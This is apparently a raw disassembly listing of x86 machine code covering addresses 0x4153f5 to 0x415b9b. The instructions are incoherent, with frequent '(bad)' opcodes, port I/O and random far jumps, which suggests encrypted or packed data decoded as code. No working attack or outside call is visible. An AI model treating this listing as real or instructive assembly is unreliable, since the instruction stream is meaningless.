  4153f5:	xchg   ecx,eax
  4153f6:	adc    dl,BYTE PTR [ebx-0xf]
  4153f9:	call   0x76c71b47
  4153fe:	dec    eax
  4153ff:	sub    al,0xf2
  415401:	jg     0x4153c6
  415403:	adc    dl,BYTE PTR ds:0x6e801d87
  415409:	jmp    0xe8a5c4d6
  41540e:	ficom  WORD PTR [ecx-0x26]
  415411:	inc    ebp
  415412:	mov    edx,0xd262ed3d
  415417:	inc    ebx
  415418:	mov    ah,0x16
  41541a:	cmp    DWORD PTR [eax],0x591fde44
  415420:	nop
  415421:	int    0xb0
  415423:	inc    eax
  415424:	jbe    0x415449
  415426:	js     0x41549a
  415428:	sahf   
  415429:	ds jb  0x4153c3
  41542c:	dec    eax
  41542d:	mov    dh,0xe4
  41542f:	inc    esi
  415430:	pop    ds
  415431:	cmp    DWORD PTR [eax+ebx*1-0x6d],edx
  415435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415436:	into   
  415437:	xchg   BYTE PTR [ebx-0x4],bl
  41543a:	jmp    0x373:0x78a6be32
  415441:	mov    eax,0x3f12d659
  415446:	rcl    DWORD PTR [eax],cl
  415448:	cmp    DWORD PTR ds:0x73896531,0x7508d04b
  415452:	fdiv   DWORD PTR [ebx+ecx*2]
  415455:	push   esp
  415456:	jecxz  0x415417
  415458:	pop    ecx
  415459:	sub    DWORD PTR [ecx],ebx
  41545b:	neg    DWORD PTR [eax+0x63178706]
  415461:	arpl   WORD PTR [edx+ebp*8+0x7fb2e181],bp
  415468:	dec    esi
  415469:	loope  0x415428
  41546b:	scas   eax,DWORD PTR es:[edi]
  41546c:	daa    
  41546d:	push   esi
  41546e:	xchg   bp,ax
  415470:	push   ds
  415471:	cld    
  415472:	or     ebp,DWORD PTR [esi+0x55]
  415475:	push   esi
  415476:	scas   al,BYTE PTR es:[edi]
  415477:	cs sbb ecx,0x7f
  41547b:	push   ss
  41547c:	shl    BYTE PTR [ebx+0x0],cl
  41547f:	jle    0x415488
  415481:	scas   eax,DWORD PTR es:[edi]
  415482:	loope  0x415436
  415484:	iret   
  415485:	cmp    edi,DWORD PTR [esi]
  415487:	neg    BYTE PTR [ebx]
  415489:	outs   dx,BYTE PTR ds:[esi]
  41548a:	loopne 0x4154fb
  41548c:	jbe    0x41542e
  41548e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41548f:	not    DWORD PTR [ebx-0x7b]
  415492:	sbb    ebp,eax
  415494:	in     al,0x86
  415496:	xor    ch,BYTE PTR ds:0xc31f5a3e
  41549c:	loop   0x41548a
  41549e:	add    bl,BYTE PTR cs:[eax+0x6b]
  4154a2:	ret    0x413d
  4154a5:	ins    BYTE PTR es:[edi],dx
  4154a6:	sti    
  4154a7:	mov    ecx,0xf2dce0d2
  4154ac:	not    DWORD PTR [edi+0x2d5a696a]
  4154b2:	push   edx
  4154b3:	cli    
  4154b4:	ja     0x41548a
  4154b6:	mov    eax,0xcd9c5f7c
  4154bb:	out    dx,eax
  4154bc:	and    bl,BYTE PTR [ecx]
  4154be:	aam    0xa2
  4154c0:	or     BYTE PTR [eax-0xdc2bff9],0x4
  4154c7:	das    
  4154c8:	jnp    0x4154bf
  4154ca:	push   ds
  4154cb:	outs   dx,BYTE PTR ds:[esi]
  4154cc:	cmp    dl,cl
  4154ce:	cdq    
  4154cf:	test   eax,0xb6de2879
  4154d4:	sbb    DWORD PTR [eax],0x3cae0844
  4154da:	jae    0x41554e
  4154dc:	pop    ds
  4154dd:	jmp    0x415540
  4154df:	jmp    0xd750b4cc
  4154e4:	rcl    BYTE PTR [edx+0x66],cl
  4154e7:	(bad)  
  4154e9:	mov    al,0x5b
  4154eb:	and    ecx,DWORD PTR [edi]
  4154ed:	sar    BYTE PTR [edx-0x6b],cl
  4154f0:	adc    ch,BYTE PTR [esi-0x5a]
  4154f3:	xor    ebp,DWORD PTR [ecx+0x23248c20]
  4154f9:	xchg   esp,eax
  4154fa:	mov    cl,0xfa
  4154fc:	jns    0x4154b3
  4154fe:	aad    0xb2
  415500:	adc    al,0x3d
  415502:	xor    BYTE PTR [esi],ch
  415504:	shl    ah,1
  415506:	and    al,0x80
  415508:	jp     0x415531
  41550a:	sbb    ebx,0xbc440b01
  415510:	or     esp,DWORD PTR [eax]
  415512:	dec    ebp
  415513:	stos   DWORD PTR es:[edi],eax
  415514:	cld    
  415515:	pop    eax
  415516:	push   ds
  415517:	les    ebp,FWORD PTR [edi-0x71]
  41551a:	out    0x8d,eax
  41551c:	das    
  41551d:	pop    edi
  41551e:	mov    edx,0x5d61b9e7
  415523:	iret   
  415524:	stos   DWORD PTR es:[edi],eax
  415525:	dec    esi
  415526:	pop    ss
  415527:	jae    0x415542
  415529:	adc    al,0x81
  41552b:	or     DWORD PTR [ebx-0x65],esp
  41552e:	xor    ecx,DWORD PTR [edx-0x27ed2051]
  415534:	in     al,dx
  415535:	in     al,dx
  415536:	sub    al,0x88
  415538:	and    eax,0x19c9429a
  41553d:	or     al,0x64
  41553f:	cs ins DWORD PTR es:[edi],dx
  415541:	add    DWORD PTR [esi-0x3a800e01],esi
  415547:	and    BYTE PTR [ebx-0x214edf7d],bh
  41554d:	xor    al,0x7d
  41554f:	xchg   edx,eax
  415550:	shl    DWORD PTR [ecx+0x6d],1
  415553:	mov    bl,0xf1
  415555:	cmp    ebx,0xcc852b01
  41555b:	jae    0x4155c2
  41555d:	push   ebx
  41555e:	lock mov cl,0xc8
  415561:	xchg   edx,eax
  415562:	jp     0x415523
  415564:	scas   al,BYTE PTR es:[edi]
  415565:	ror    ah,1
  415567:	cmp    BYTE PTR [edx+0xa],bh
  41556a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41556b:	jg     0x415577
  41556d:	add    DWORD PTR [edi],ebp
  41556f:	and    BYTE PTR [edi-0x20],ah
  415572:	xor    al,0x35
  415574:	cmc    
  415575:	in     al,0x4
  415577:	inc    esi
  415578:	add    ebp,DWORD PTR [ebp-0x3b]
  41557b:	cmc    
  41557c:	das    
  41557d:	jne    0x41555b
  41557f:	ret    0xcfb6
  415582:	push   0xc7f9364
  415587:	push   ecx
  415588:	cmp    DWORD PTR [ebp+0x7c0da2c6],edx
  41558e:	mov    eax,0x2a8cf911
  415593:	xchg   edx,eax
  415594:	sbb    bh,0x4f
  415597:	adc    eax,0x4efc6bfe
  41559c:	mov    ds,WORD PTR [ecx]
  41559e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41559f:	sub    ch,BYTE PTR [ebx-0x329b695f]
  4155a5:	lea    eax,[edx]
  4155a7:	push   ecx
  4155a8:	cwde   
  4155a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155aa:	je     0x4155f1
  4155ac:	cli    
  4155ad:	retf   0xe164
  4155b0:	out    dx,eax
  4155b1:	xor    eax,0xc8677dda
  4155b6:	jmp    0xfbcc:0xfba7ae40
  4155bd:	xor    eax,0xc755ee3f
  4155c2:	mov    dh,cl
  4155c4:	imul   esp,DWORD PTR [edx-0x33],0x6bfa9ddc
  4155cb:	mov    edi,0x36843345
  4155d0:	arpl   bx,ax
  4155d2:	in     al,dx
  4155d3:	in     eax,dx
  4155d4:	mov    esi,0x33c3fb26
  4155d9:	push   es
  4155da:	or     al,BYTE PTR [ecx-0x29a10d54]
  4155e0:	push   esi
  4155e1:	jo     0x4155d1
  4155e3:	mov    bl,0x10
  4155e5:	stos   DWORD PTR es:[edi],eax
  4155e6:	adc    ecx,DWORD PTR [edx]
  4155e8:	repnz icebp 
  4155ea:	mov    dl,0xa4
  4155ec:	mov    al,0x24
  4155ee:	rcl    DWORD PTR [edi+esi*8],1
  4155f1:	shl    BYTE PTR [edx-0x54],0x40
  4155f5:	push   edi
  4155f6:	fnsave [edx]
  4155f8:	out    dx,al
  4155f9:	adc    bl,BYTE PTR [edx-0x27]
  4155fc:	add    al,0xc0
  4155fe:	push   bx
  415600:	imul   DWORD PTR [esi-0x61425f0b]
  415606:	and    eax,0x483c26e6
  41560b:	mov    ds:0x925bfadc,eax
  415610:	xchg   BYTE PTR [ebx+0x33af634b],bl
  415616:	or     eax,0x92a00093
  41561b:	sbb    cl,BYTE PTR [esi+0x2c]
  41561e:	test   BYTE PTR [eax+0x4c4dd834],dh
  415624:	adc    al,0x24
  415626:	sub    ecx,DWORD PTR [eax+ebx*4-0x76]
  41562a:	pop    esi
  41562b:	fild   QWORD PTR [ecx]
  41562d:	adc    eax,0xbe5d29e5
  415632:	das    
  415633:	(bad)  
  415634:	frstor [esi-0x46]
  415637:	lods   eax,DWORD PTR ds:[esi]
  415638:	fist   DWORD PTR [ebp+0x7f]
  41563b:	aad    0xf1
  41563d:	cmp    eax,0x7d146655
  415642:	pushf  
  415643:	int3   
  415644:	xor    BYTE PTR [edi],dh
  415646:	out    dx,al
  415647:	test   esp,edi
  415649:	and    ebp,DWORD PTR [esi+0x5]
  41564c:	int3   
  41564d:	jbe    0x415645
  41564f:	dec    edx
  415650:	pop    ss
  415651:	pushf  
  415652:	mov    ds:0x36c3671b,eax
  415657:	push   0xffffff84
  415659:	aad    0xf4
  41565b:	repz jmp 0x2763542b
  415661:	(bad)  
  415663:	rol    BYTE PTR [esi+esi*4-0x1b],1
  415667:	and    esi,DWORD PTR [edi+0x6c]
  41566a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41566b:	dec    esp
  41566c:	in     al,0xca
  41566e:	mov    edx,0x11a49d6c
  415673:	test   BYTE PTR [esi+0x768af4e9],ah
  415679:	test   BYTE PTR [ebx-0x7139ed6c],0xb3
  415680:	xor    edx,eax
  415682:	fs iret 
  415684:	lds    esp,FWORD PTR [ecx]
  415686:	mov    al,ds:0x5cccf153
  41568b:	xchg   esp,eax
  41568c:	pop    es
  41568d:	or     edi,DWORD PTR [ecx-0x1fe51b68]
  415693:	push   ebp
  415694:	mov    WORD PTR [ebx+0x13ad678f],?
  41569a:	sub    eax,0x20bb953b
  41569f:	mov    ch,al
  4156a1:	mov    bh,0x6e
  4156a3:	pop    DWORD PTR [ecx+0xf]
  4156a6:	xchg   esi,eax
  4156a7:	out    0x2d,eax
  4156a9:	fsub   DWORD PTR [ebx+edx*1-0x7d8a0afb]
  4156b0:	dec    ebx
  4156b1:	sbb    ebx,DWORD PTR [esi-0x673098a4]
  4156b7:	fcom   DWORD PTR [eax]
  4156b9:	out    0x68,al
  4156bb:	jecxz  0x4156bd
  4156bd:	dec    esi
  4156be:	cwde   
  4156bf:	cdq    
  4156c0:	sub    BYTE PTR [ecx],dl
  4156c2:	or     ecx,edi
  4156c4:	mov    cl,0x51
  4156c6:	jge    0x41564e
  4156c8:	in     al,0x49
  4156ca:	push   esp
  4156cb:	popa   
  4156cc:	mov    DWORD PTR [edi-0x7e51c840],0x21f414a5
  4156d6:	bound  ecx,QWORD PTR [eax+0x12]
  4156d9:	lea    ecx,[ecx]
  4156db:	lea    ecx,[ecx+0x56]
  4156de:	int3   
  4156df:	dec    eax
  4156e0:	retf   
  4156e1:	add    DWORD PTR [ebx+0x35],0xffffffea
  4156e5:	dec    edi
  4156e6:	outs   dx,BYTE PTR cs:[esi]
  4156e8:	lahf   
  4156e9:	rsqrtps xmm2,xmm3
  4156ec:	push   ds
  4156ed:	jb     0x41570b
  4156ef:	in     al,dx
  4156f0:	or     eax,DWORD PTR [eax+0x59]
  4156f3:	inc    ebp
  4156f4:	jbe    0x4156e1
  4156f6:	int    0x4
  4156f8:	(bad)  
  4156f9:	rol    dh,1
  4156fb:	loope  0x4156d0
  4156fd:	sub    eax,eax
  4156ff:	ret    0x8784
  415702:	push   esp
  415703:	xor    DWORD PTR [edi],ebx
  415705:	ror    ecx,1
  415707:	cmp    DWORD PTR [edx],0xdb1e78f
  41570d:	clc    
  41570e:	sbb    al,0x44
  415710:	call   0x556a:0x386cc73c
  415717:	(bad)  
  415718:	sbb    edi,DWORD PTR [edi-0x2637846f]
  41571e:	bound  eax,QWORD PTR [esi+0x66]
  415721:	add    al,0x81
  415723:	dec    edx
  415724:	xchg   BYTE PTR [ebp+0x59],al
  415727:	inc    eax
  415728:	xchg   ecx,eax
  415729:	aaa    
  41572a:	inc    eax
  41572b:	popf   
  41572c:	mov    dh,0x68
  41572e:	dec    edx
  41572f:	rol    dh,cl
  415731:	inc    ebp
  415732:	and    DWORD PTR [esi+0x3cc0f679],esp
  415738:	sbb    DWORD PTR cs:[ebx+0x21],esi
  41573c:	jl     0x4157a4
  41573e:	sub    eax,0x9753d40d
  415743:	or     bh,ch
  415745:	add    al,0x61
  415747:	or     BYTE PTR [ecx+ecx*8-0x4],bh
  41574b:	stos   BYTE PTR es:[edi],al
  41574c:	xchg   ebx,eax
  41574d:	lahf   
  41574e:	mov    bh,0x6
  415750:	add    BYTE PTR [eax],dh
  415752:	cmc    
  415753:	sub    DWORD PTR [ecx-0x57],0x34625127
  41575a:	and    DWORD PTR [ebp-0x3a181c33],ebx
  415760:	add    eax,0x8609d3c4
  415765:	test   al,0x94
  415767:	inc    eax
  415768:	in     eax,0x22
  41576a:	adc    BYTE PTR [ecx],dh
  41576c:	or     al,0xed
  41576e:	rcr    DWORD PTR [ebx],cl
  415770:	and    ebp,DWORD PTR [ebx]
  415772:	add    ah,ch
  415774:	test   eax,0x3d6f633
  415779:	dec    esp
  41577a:	sub    bl,BYTE PTR [esi-0x6b]
  41577d:	jae    0x4157b5
  41577f:	retf   
  415780:	adc    eax,0xdb80ad9a
  415785:	sub    eax,0x45be4d02
  41578a:	mov    ds:0xeef4b65f,eax
  41578f:	out    0x80,al
  415791:	jbe    0x41576a
  415793:	and    BYTE PTR [ebx],ah
  415795:	imul   edx,DWORD PTR [esi],0xffffffba
  415798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415799:	mov    ebx,0x50701fd0
  41579e:	mov    ch,bl
  4157a0:	mov    al,0x8e
  4157a2:	shr    DWORD PTR [ebp-0x43313d0a],cl
  4157a8:	cli    
  4157a9:	cwde   
  4157aa:	sub    DWORD PTR [ebp+0x5c],0x7e972ed0
  4157b1:	(bad)  
  4157b2:	xor    DWORD PTR [ebx-0x267cdd10],edx
  4157b8:	push   es
  4157b9:	lock add DWORD PTR [edi-0x4a],0xe0adcbde
  4157c1:	push   esi
  4157c2:	sub    ebx,edi
  4157c4:	outs   dx,DWORD PTR ds:[esi]
  4157c5:	ins    BYTE PTR es:[edi],dx
  4157c6:	mov    ecx,0xc45f0c2a
  4157cb:	bound  eax,QWORD PTR [eax+0x53821b69]
  4157d1:	(bad)  
  4157d2:	repnz mov ecx,0xb499f5b8
  4157d8:	dec    ebx
  4157d9:	mov    ecx,0xcea534d5
  4157de:	mov    al,0xea
  4157e0:	leave  
  4157e1:	lahf   
  4157e2:	sub    al,0x7
  4157e4:	xchg   ecx,eax
  4157e5:	mov    es,WORD PTR [edi+0x1d]
  4157e8:	call   0x3fd9ded4
  4157ed:	dec    eax
  4157ee:	je     0x415786
  4157f0:	into   
  4157f1:	aad    0xab
  4157f3:	xor    eax,DWORD PTR [edx+0x104ee175]
  4157f9:	push   es
  4157fa:	mov    DWORD PTR [edi],0x1f52318d
  415800:	add    cl,ah
  415802:	std    
  415803:	mov    bh,0x4d
  415805:	inc    edx
  415806:	ss aam 0x19
  415809:	aas    
  41580a:	mov    bl,0xe6
  41580c:	test   DWORD PTR [eax-0x98907eb],edx
  415812:	xor    edx,DWORD PTR [ecx+0x4b]
  415815:	es pop ebp
  415817:	aaa    
  415818:	pop    ecx
  415819:	popf   
  41581a:	cmp    ebp,edi
  41581c:	leave  
  41581d:	inc    esp
  41581e:	in     eax,dx
  41581f:	push   eax
  415820:	hlt    
  415821:	shl    DWORD PTR [ebx+0x7b36ec0c],cl
  415827:	fdiv   DWORD PTR [ebx+0x57]
  41582a:	mov    bl,0x45
  41582c:	or     al,0x49
  41582e:	sti    
  41582f:	test   al,0xd1
  415831:	mov    ch,0x45
  415833:	es sub al,0x1
  415836:	in     al,0xcd
  415838:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415839:	and    edi,ebx
  41583b:	add    bh,BYTE PTR [edi+0x46]
  41583e:	and    DWORD PTR [esp+eiz*8-0x1d81c754],eax
  415845:	test   DWORD PTR [ecx+0x209434ca],0x7505d221
  41584f:	cmp    bh,BYTE PTR [ebp+0x16db4039]
  415855:	ins    BYTE PTR es:[edi],dx
  415856:	test   al,0x78
  415858:	ss xchg esi,eax
  41585a:	(bad)  
  41585b:	iret   
  41585c:	mov    esp,0xa60e6ef5
  415861:	add    eax,ecx
  415863:	xchg   ecx,eax
  415864:	dec    ecx
  415865:	fimul  DWORD PTR [ebx+0x42]
  415868:	mov    bh,0x5b
  41586a:	cmp    al,0x7f
  41586c:	mov    ecx,DWORD PTR [esi-0x48]
  41586f:	out    dx,al
  415870:	jle    0x415850
  415872:	or     al,0x3d
  415874:	jnp    0x4158c7
  415876:	and    esi,ebp
  415878:	add    al,bh
  41587a:	inc    esi
  41587b:	mov    ds:0xec622115,eax
  415880:	jb     0x41589d
  415882:	pop    edx
  415883:	(bad)  
  415885:	xor    al,0x22
  415887:	xchg   ecx,eax
  415888:	loope  0x415812
  41588a:	mov    edi,ebx
  41588c:	sub    al,0xfc
  41588e:	inc    ebx
  41588f:	fild   DWORD PTR [edx+0x5e51ff5f]
  415895:	enter  0xc782,0xb7
  415899:	je     0x415846
  41589b:	mov    ecx,DWORD PTR [ecx+edx*8+0x48]
  41589f:	pop    ebx
  4158a0:	jno    0x4158c8
  4158a2:	sub    al,0x8e
  4158a4:	shl    BYTE PTR [eax+0xb],1
  4158a7:	repz aas 
  4158a9:	xchg   ecx,eax
  4158aa:	xchg   edx,eax
  4158ab:	nop
  4158ac:	inc    esp
  4158ad:	scas   al,BYTE PTR es:[edi]
  4158ae:	pop    eax
  4158af:	es jnp 0x415919
  4158b2:	mov    ebx,0x9a75296a
  4158b7:	fcmovnu st,st(2)
  4158b9:	test   al,0x3
  4158bb:	xchg   esi,eax
  4158bc:	call   0x89af2131
  4158c1:	dec    eax
  4158c2:	jl     0x4158e0
  4158c4:	cmp    al,0x26
  4158c6:	in     al,0x97
  4158c8:	sbb    BYTE PTR [edx+0x38fe7578],bh
  4158ce:	mov    ds:0x68a7a07c,al
  4158d3:	sbb    BYTE PTR [eax+0x54],cl
  4158d6:	sub    cl,BYTE PTR [ebp+0x66]
  4158d9:	mov    bh,0x62
  4158db:	xchg   ebx,eax
  4158dc:	mov    edi,0x16200c2b
  4158e1:	daa    
  4158e2:	xor    esp,DWORD PTR [ecx+ebx*1-0x2683d3f7]
  4158e9:	sbb    bh,BYTE PTR [edi-0x42eb10a3]
  4158ef:	int3   
  4158f0:	inc    eax
  4158f1:	repnz into 
  4158f3:	ins    DWORD PTR es:[edi],dx
  4158f4:	out    0x24,al
  4158f6:	fisub  DWORD PTR [ecx+0x48]
  4158f9:	push   0x36166375
  4158fe:	mov    dl,0xbe
  415900:	push   cs
  415901:	mov    ch,0xb3
  415903:	rcl    BYTE PTR [esi+edx*8-0x15de2d50],1
  41590a:	sahf   
  41590b:	add    eax,0xe35a1384
  415910:	sub    eax,0x7efc06ed
  415915:	mov    DWORD PTR [eax+0x70fa2183],eax
  41591b:	and    eax,0xf10ba464
  415920:	lods   al,BYTE PTR ds:[esi]
  415921:	lock sbb ch,bl
  415924:	call   0x1a2a:0xb41b31f2
  41592b:	sbb    DWORD PTR [edi+0x70],ecx
  41592e:	in     al,dx
  41592f:	nop
  415930:	lods   eax,DWORD PTR ds:[esi]
  415931:	mov    esp,0xd266c84d
  415936:	xchg   esi,eax
  415937:	xchg   esi,eax
  415938:	lock and al,BYTE PTR [ebp-0x41]
  41593c:	adc    ebp,DWORD PTR [ecx-0xe]
  41593f:	pop    eax
  415940:	xchg   ecx,eax
  415941:	call   0xf3d3b928
  415946:	adc    al,BYTE PTR [ebp-0x212bb45]
  41594c:	inc    esi
  41594d:	xchg   ebp,eax
  41594e:	jb     0x41596e
  415950:	je     0x415917
  415952:	lods   al,BYTE PTR ds:[esi]
  415953:	adc    eax,DWORD PTR [edi+ecx*4-0x250277cc]
  41595a:	scas   al,BYTE PTR es:[edi]
  41595b:	xchg   esp,eax
  41595c:	ins    DWORD PTR es:[edi],dx
  41595d:	or     ebx,esp
  41595f:	mov    esp,0x2e68f704
  415964:	xor    eax,0x10be228e
  415969:	dec    ecx
  41596a:	and    cl,BYTE PTR [edx+0x3e]
  41596d:	ret    0xec32
  415970:	nop
  415971:	sub    BYTE PTR [ecx-0x563b276d],0xad
  415978:	lods   eax,DWORD PTR ds:[esi]
  415979:	push   es
  41597a:	mov    edx,0x3f3270de
  41597f:	fmul   DWORD PTR [esi]
  415981:	scas   al,BYTE PTR es:[edi]
  415982:	mov    dl,0xd2
  415984:	dec    ebp
  415985:	jmp    0x70a8:0x2aabda57
  41598c:	les    ecx,FWORD PTR [edi-0x52b37489]
  415992:	push   cs
  415993:	popa   
  415994:	inc    edi
  415995:	(bad)  
  415996:	repnz mov edi,0x2281db2a
  41599c:	clc    
  41599d:	mov    cl,0x90
  41599f:	dec    ebp
  4159a0:	aas    
  4159a1:	lea    edx,ss:[esi]
  4159a4:	rol    DWORD PTR [esi-0x13],cl
  4159a7:	push   esp
  4159a8:	les    eax,FWORD PTR [ecx+0x59]
  4159ab:	pop    esi
  4159ac:	cmp    eax,0xa4af7f70
  4159b1:	jp     0x415989
  4159b3:	lahf   
  4159b4:	rol    DWORD PTR [edi-0x69],1
  4159b7:	out    dx,eax
  4159b8:	(bad)  
  4159b9:	std    
  4159ba:	mov    eax,0x186e4db0
  4159bf:	sbb    BYTE PTR [eax+0x1e],bl
  4159c2:	int3   
  4159c3:	sub    edi,ebx
  4159c5:	repz inc ebx
  4159c7:	(bad)  [edi+eiz*4+0x32]
  4159cb:	out    dx,al
  4159cc:	shr    BYTE PTR ds:0x806638de,cl
  4159d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159d3:	sahf   
  4159d4:	dec    edx
  4159d5:	sbb    edx,esi
  4159d7:	test   al,0x77
  4159d9:	scas   al,BYTE PTR es:[edi]
  4159da:	push   eax
  4159db:	and    DWORD PTR [eax+0x2],esp
  4159de:	shl    DWORD PTR [eax-0x6c],0x80
  4159e2:	cdq    
  4159e3:	mov    al,0x6e
  4159e5:	pop    edi
  4159e6:	int    0x6b
  4159e8:	add    eax,0x18d91b42
  4159ed:	fidiv  DWORD PTR [ecx]
  4159ef:	sbb    bl,BYTE PTR [ecx+esi*8]
  4159f2:	pop    eax
  4159f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159f5:	sbb    cl,cl
  4159f7:	idiv   BYTE PTR es:[ebx+edx*4-0x4b]
  4159fc:	push   ecx
  4159fd:	inc    eax
  4159fe:	dec    ebp
  4159ff:	fdiv   st(7),st
  415a01:	mov    ds:0x7e341c18,al
  415a06:	aad    0x38
  415a08:	in     eax,0xed
  415a0a:	or     BYTE PTR [edi-0x2b6e530e],dl
  415a10:	xor    DWORD PTR [eax+edi*8-0x3a],0xe61ecf6b
  415a18:	xchg   dh,al
  415a1a:	mov    ch,BYTE PTR [esi-0x5]
  415a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a1e:	dec    ecx
  415a1f:	dec    esp
  415a20:	mov    bh,0x48
  415a22:	rcl    edi,cl
  415a24:	(bad)  
  415a25:	popa   
  415a26:	popf   
  415a27:	xchg   DWORD PTR [esi+0x67],ebp
  415a2a:	fisubr DWORD PTR [ecx+edx*4-0x67]
  415a2f:	and    BYTE PTR [ecx],ah
  415a31:	(bad)  
  415a32:	stos   BYTE PTR es:[edi],al
  415a33:	(bad)  
  415a34:	cmp    DWORD PTR [ecx+ecx*1+0x2e],ebp
  415a38:	mov    esp,ebp
  415a3a:	mov    al,ds:0x13bd6e85
  415a3f:	and    ah,BYTE PTR [ecx-0x67]
  415a42:	mov    bh,0xc3
  415a44:	mov    ?,ecx
  415a46:	cmp    edi,DWORD PTR [edi+0x7a]
  415a49:	mov    edi,0xf6f83a68
  415a4e:	xchg   ebx,eax
  415a4f:	test   al,0x22
  415a51:	xor    ecx,DWORD PTR [eax]
  415a53:	dec    edx
  415a54:	mov    al,0xfb
  415a56:	mov    esi,0x60acbe88
  415a5b:	fdivr  DWORD PTR [edi-0x60]
  415a5e:	xor    ch,BYTE PTR [ebx-0x65]
  415a61:	push   esp
  415a62:	sbb    al,0x54
  415a64:	xor    al,BYTE PTR [ecx]
  415a66:	aaa    
  415a67:	mov    esi,0x225ef12d
  415a6c:	cmp    BYTE PTR [edx-0x19],cl
  415a6f:	xor    eax,0x2eab9058
  415a74:	push   ds
  415a75:	scas   eax,DWORD PTR es:[edi]
  415a76:	jo     0x415aa2
  415a78:	mov    cs,esi
  415a7a:	stos   BYTE PTR es:[edi],al
  415a7b:	cmp    BYTE PTR [esi],bh
  415a7d:	add    eax,0x64e4352f
  415a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a83:	jp     0x415ad5
  415a85:	(bad)
  415a89:	mov    eax,ds:0x1d24631e
  415a8e:	std    
  415a8f:	aam    0x33
  415a91:	bound  ecx,QWORD PTR [ecx]
  415a93:	sbb    al,0xf8
  415a95:	adc    BYTE PTR [ecx],0xe2
  415a98:	jmp    0x415a63
  415a9a:	xchg   edx,eax
  415a9b:	pop    es
  415a9c:	inc    ebp
  415a9d:	clc    
  415a9e:	xchg   DWORD PTR [ebp-0x66],edi
  415aa1:	out    dx,eax
  415aa2:	stos   BYTE PTR es:[edi],al
  415aa3:	dec    eax
  415aa4:	mov    WORD PTR [eax+0x19],?
  415aa7:	aam    0x97
  415aa9:	(bad)  
  415aaa:	mov    ebp,0xf9d5765e
  415aaf:	scas   eax,DWORD PTR es:[edi]
  415ab0:	lock mov ds:0xb8853ec8,al
  415ab6:	(bad)  
  415ab8:	out    dx,eax
  415ab9:	pop    ebp
  415aba:	repnz call 0xff97:0x4745840b
  415ac2:	dec    esi
  415ac3:	pop    ecx
  415ac4:	xchg   esi,eax
  415ac5:	cld    
  415ac6:	sub    dl,cl
  415ac8:	shl    ecx,cl
  415aca:	push   esp
  415acb:	jle    0x415b2c
  415acd:	mov    ds:0xe580831a,al
  415ad2:	shl    BYTE PTR [eax-0x7a],cl
  415ad5:	add    BYTE PTR [ecx+0x73],dh
  415ad8:	retf   0x2d02
  415adb:	into   
  415adc:	cdq    
  415add:	add    edi,esp
  415adf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ae0:	popf   
  415ae1:	aas    
  415ae2:	fstp   TBYTE PTR [edi-0x41]
  415ae5:	add    al,0xad
  415ae7:	mov    dh,0x12
  415ae9:	adc    al,ch
  415aeb:	add    al,0x7b
  415aed:	and    BYTE PTR [eax],ch
  415aef:	cmp    edx,ebx
  415af1:	in     eax,dx
  415af2:	out    0x1,eax
  415af4:	shl    DWORD PTR [ebx+edx*2+0x5b],cl
  415af8:	adc    ah,BYTE PTR [edi-0x39]
  415afb:	mov    eax,DWORD PTR [esi]
  415afd:	add    edi,eax
  415aff:	dec    edx
  415b00:	lods   eax,DWORD PTR ds:[esi]
  415b01:	sub    al,0x33
  415b03:	aaa    
  415b04:	cli    
  415b05:	aas    
  415b06:	lahf   
  415b07:	cmc    
  415b08:	dec    eax
  415b09:	or     DWORD PTR [edx+0x77],edx
  415b0c:	pop    esp
  415b0d:	mov    DWORD PTR ds:0x7c2f568f,ebx
  415b13:	cli    
  415b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b16:	xlat   BYTE PTR ds:[ebx]
  415b17:	jg     0x415b16
  415b19:	dec    edi
  415b1a:	ror    edx,cl
  415b1c:	dec    ecx
  415b1d:	nop
  415b1e:	enter  0x45d8,0xe2
  415b22:	(bad)  
  415b23:	jnp    0x415ac5
  415b25:	and    DWORD PTR [edi+0x50],0xffffffe5
  415b29:	jbe    0x415b54
  415b2b:	out    dx,al
  415b2c:	add    esi,DWORD PTR [ebx+eax*4-0x61a3b0d8]
  415b33:	mov    eax,ds:0xd1d6d208
  415b38:	out    dx,al
  415b39:	es sbb cl,bh
  415b3c:	popa   
  415b3d:	mov    dl,bl
  415b3f:	xor    DWORD PTR ds:0xd50d54a9,edx
  415b45:	ror    DWORD PTR [esp+ebp*8],0x91
  415b49:	retf   
  415b4a:	mov    ah,bl
  415b4c:	je     0x415b9b
  415b4e:	mov    ch,0x9c
  415b50:	push   cs
  415b51:	int3   
  415b52:	push   0xfffffffd
  415b54:	and    al,0xbc
  415b56:	adc    eax,0x5b775b7b
  415b5b:	mov    BYTE PTR [esi-0x15ea4037],dl
  415b61:	ds sar ebx,1
  415b64:	retf   
  415b65:	or     DWORD PTR [eax+eiz*2+0x10],0xa
  415b6a:	pop    ss
  415b6b:	dec    ebp
  415b6c:	sub    al,0xe2
  415b6e:	pop    edi
  415b6f:	dec    esp
  415b70:	ins    DWORD PTR es:[edi],dx
  415b71:	aad    0x3a
  415b73:	(bad)  
  415b74:	pop    eax
  415b75:	mov    edi,0xb2d15331
  415b7a:	(bad)  
  415b7b:	dec    DWORD PTR [ecx+0x36]
  415b7e:	and    ah,BYTE PTR [ecx]
  415b80:	or     DWORD PTR [edi-0x5e46215c],esi
  415b86:	imul   eax,DWORD PTR gs:[esi],0x7141d000
  415b8d:	aam    0x95
  415b8f:	jle    0x415b56
  415b91:	aaa    
  415b92:	mov    edx,0x71950881
  415b97:	push   es
  415b98:	scas   eax,DWORD PTR es:[edi]
  415b99:	sbb    ecx,DWORD PTR [eax]
  415b9b:	mov    ds:0xcea8150d,eax
